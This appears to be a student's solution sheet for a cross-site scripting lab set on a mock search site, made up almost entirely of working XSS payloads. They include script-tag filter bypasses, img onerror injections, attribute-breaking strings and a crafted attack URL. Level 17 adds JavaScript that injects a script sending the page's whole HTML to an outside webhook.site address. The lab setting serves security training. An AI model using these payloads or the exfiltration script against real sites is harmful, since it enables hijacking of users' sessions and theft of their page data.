# 0. Welcome

N/A

# 1. A Truly Disruptive Startup (3 points)

```
TODO: <script>success("HackedbyDedSec")</script>
```

# 2. No Script Allowed (3 points)

```
TODO: <scriptscript>success("HackedbyDedSec")</script>
```

# 3. One More Time, Like You Mean It (3 points)

```
TODO: <scripscriptt>success("HackedbyDedSec")</scripscriptt>
```

# 4. An Open-and-Shut Case (3 points)

```
TODO: <SCRIPT>success("HackedbyDedSec")</SCRIPT>
```

# 5. Time to Mix Things Up (3 points)

```
TODO: <scRIPT>success("HackedbyDedSec")</scRIPT>
```

# 6. A Picture is Worth a Thousand Words (3 points)

```
TODO: <img src=x onerror=success("HackedByDedSec")>
```

# 7. Between a Rock And a Hard Place (3 points)

```
TODO: <img src=x onload=onerror = success("HackedByDedSec")>
```

# 8. Angle of Death (6 points)

Attack input:

```
TODO: <<img src=x onerror=success("HackedByDedSec")>>
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 9. All in a Day's Work

N/A

# 10. In the Wrong Place at the Wrong Time (3 points)

```
TODO: " onload=success("HackedByDedSec") "
```

# 11. You Can't Win 'em All (6 points)

Attack input:

```
TODO: "" onload=success("HackedByDedSec") ""
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 12. When All is Said and Done (6 points)

Attack input:

```
TODO: ' onload=success("HackedByDedSec") ' 
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 13. When You Want a Job Done Right

N/A

# 14. Here Today and Gone Tomorrow (3 points)

Attack URL: http://caloogle.xyz:4140/search?q=ss&lang=en " onload=success("HackedByDedSec") "

```
TODO: http://caloogle.xyz:4140/search?q=ss&lang=en " onload=success("HackedByDedSec") "
```

# 15. The Early Bird Catches the Worm (3 points)

```
TODO: </script><script>success()</script>
```

# 16. Tying Up Loose Ends (3 points)

```
TODO: <<//script><script>success()<<//script>
```

# 17. Take a Page Out of Their Book (6 points)

Attack code:

```js
// TODO: 
function send(payload) {
    fetch('/comment', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({text: 'http://localhost:4000/17', id: "1);success("})
    }).then((response) => response.clone().text())
    .then((data) => console.log(data));
}
send('<script> payload = document.documentElement.innerHTML; window.location="https://webhook.site/my-private-id?query=" + encodeURIComponent(payload); </script>')
```

# 18. Congrats

N/A

# Əlavə qeydlər

```
Əlavə qeydlərinizi yazın
```
